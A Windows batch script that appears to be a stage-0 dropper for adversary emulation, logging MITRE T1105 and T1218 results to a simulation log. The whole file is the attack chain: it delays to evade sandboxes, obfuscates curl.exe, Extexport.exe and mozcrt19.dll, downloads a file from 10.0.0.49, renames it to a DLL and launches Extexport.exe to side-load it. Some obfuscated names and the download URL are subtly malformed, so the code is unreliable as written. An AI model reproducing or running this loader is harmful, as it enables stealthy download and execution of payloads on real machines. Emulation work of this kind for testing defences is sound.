@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8121\7c0f983b
SET fpakbq=Macula-Stage0-8121
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8121-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=visio.txt
SET fpldhe=8121

REM Create log directory if it doesn't exist
SET logdir=%APPDATA%\!yydue!
IF NOT EXIST "!logdir!" mkdir "!logdir!"
SET logfile=!logdir!\macula-simulations.log

REM Random variable names for encoded parts
SET fhqet=c
SET mnbvc=u
SET rtyui=r
SET lkjhg=l
SET poiuy=.
SET zxcvb=e
SET asdfg=x
SET qwert=e

SET vbnmj=E
SET nbvcd=x
SET mjuyh=t
SET vcxxz=e
SET dfghj=x
SET bvcxz=p
SET gfdsa=o
SET nbvfg=r
SET zsecd=t
SET poldc=.
SET lkmnj=e
SET okmji=x
SET uhbgy=e

SET azsxd=m
SET edcrf=o
SET tgbny=z
SET yhnuj=c
SET ikmpl=r
SET oknij=t
SET wsqaz=1
SET edcvg=9
SET qazws=.
SET wsxcd=d
SET rfvtg=l
SET yhnjm=l

REM Initial delay to evade sandbox analysis (30-60 seconds)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start=45s>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_end=45s>> "!logfile!" 2>nul

REM Obfuscate curl.exe character by character
SET vctool=!fhqet!!mnbvc!!rtyui!!lkjhg!!poiuy!!zxcvb!!asdfg!xqwert
SET curl_exe=!vctool!

REM Obfuscate Extexport.exe character by character
SET xpdll1=!vbnmj!!nbvcd!!mjuyh!!vcxxz!!dfghj!!bvcxz!!gfdsa!!nbvfg!!zsecd!!poldc!!zxcvb!!asdfg!xqwert
SET extexport_exe=!xpdll1!

REM Obfuscate mozcrt19.dll character by character
SET dllname=!azsxd!!edcrf!!tgbny!!yhnuj!!ikmpl!!oknij!!wsqaz!!edcvg!!qazws!!wsxcd!!rfvtg!!yhnjm!

REM Build encoded command parts
SET optk=k
SET opts=s
SET opto=o
SET null=nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_before_heartbeat=10s>> "!logfile!" 2>nul
ping -n 10 127.0.0.1 >nul

REM Check server availability (heartbeat)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_check_start=!rdzgrnne!>> "!logfile!" 2>nul
!curl_exe! -!optk! -!opts! -!opto! !null! "!rdzgrnne!"
SET hbresult=0
IF !ERRORLEVEL! EQU 0 SET hbresult=1
SET hberr=
IF !hbresult! EQU 0 SET hberr=connection_failed
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_check_end=!hbresult!>> "!logfile!" 2>nul

REM Log T1105 TTP for heartbeat check
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET mm=%%a
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET dd=%%b
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET yyyy=%%c
SET mm=0!mm!
SET dd=0!dd!
SET mm=!mm:~-2!
SET dd=!dd:~-2!
SET logdate=!yyyy!-!mm!-!dd!
SET logtime=!TIME!
SET logtime=!logtime:~0,12!
echo [!logdate! !logtime!000][!omxgazu!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!hbresult!:!hberr!>> "!logfile!" 2>nul

REM Delay before download
SET /A rdelay=!RANDOM! %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_start=!rdelay!s>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T !rdelay! >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_end=!rdelay!s>> "!logfile!" 2>nul

REM Create output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: directory_create_start=!yktnwwf!>> "!logfile!" 2>nul
IF NOT EXIST "!yktnwwf!" mkdir "!yktnwwf!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: directory_create_end=!yktnwwf!>> "!logfile!" 2>nul

REM Clean trailing slash from URL if present
SET clean_repbmqg=!repbmqg!
IF "!clean_repbmqg:~-1!"=="/" SET clean_repbmqg=!clean_repbmqg:~0,-1!

REM Construct download URL
SET dlurl=http://!clean_repbmqg!/!edjwtl!
SET outpath=!yktnwwf!\!edjwtl!

REM Delay before download
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_before_download=8s>> "!logfile!" 2>nul
ping -n 8 127.0.0.1 >nul

REM Download DLL
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_start=!dlurl!>> "!logfile!" 2>nul
!curl_exe! -!optk! -!opts! -o "!outpath!" "!dlurl!"
SET dlresult=0
IF !ERRORLEVEL! EQU 0 SET dlresult=1
SET dlerr=
IF !dlresult! EQU 0 SET dlerr=download_failed
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_end=!dlresult!>> "!logfile!" 2>nul

REM Log T1105 TTP for download
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET mm=%%a
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET dd=%%b
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET yyyy=%%c
SET mm=0!mm!
SET dd=0!dd!
SET mm=!mm:~-2!
SET dd=!dd:~-2!
SET logdate=!yyyy!-!mm!-!dd!
SET logtime=!TIME!
SET logtime=!logtime:~0,12!
echo [!logdate! !logtime!000][!omxgazu!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!dlresult!:!dlerr!>> "!logfile!" 2>nul

REM Delay before rename
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_before_rename=12s>> "!logfile!" 2>nul
ping -n 12 127.0.0.1 >nul

REM Rename file to mozcrt19.dll
SET newdllpath=!yktnwwf!\!dllname!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_start=!outpath! to !newdllpath!>> "!logfile!" 2>nul
IF EXIST "!outpath!" (
    REN "!outpath!" "!dllname!"
    SET rnresult=1
    SET rnerr=
) ELSE (
    SET rnresult=0
    SET rnerr=source_not_found
)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_end=!rnresult!>> "!logfile!" 2>nul

REM Delay before execution
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_before_execution=15s>> "!logfile!" 2>nul
timeout /t 15 /nobreak >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!logfile!" 2>nul
cd /d "!yktnwwf!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_end=!yktnwwf!>> "!logfile!" 2>nul

REM Execute Extexport.exe with DLL
SET args="!yktnwwf!" foo bar
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: process_start=!extexport_exe! !args!>> "!logfile!" 2>nul
START "" "!extexport_exe!" !args!
SET execresult=0
IF !ERRORLEVEL! EQU 0 SET execresult=1
SET execerr=
IF !execresult! EQU 0 SET execerr=execution_failed
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: process_end=!execresult!>> "!logfile!" 2>nul

REM Log T1218 TTP for execution
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET mm=%%a
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET dd=%%b
FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET yyyy=%%c
SET mm=0!mm!
SET dd=0!dd!
SET mm=!mm:~-2!
SET dd=!dd:~-2!
SET logdate=!yyyy!-!mm!-!dd!
SET logtime=!TIME!
SET logtime=!logtime:~0,12!
echo [!logdate! !logtime!000][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!execresult!:!execerr!>> "!logfile!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay_start=20s>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 20 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay_end=20s>> "!logfile!" 2>nul

ENDLOCAL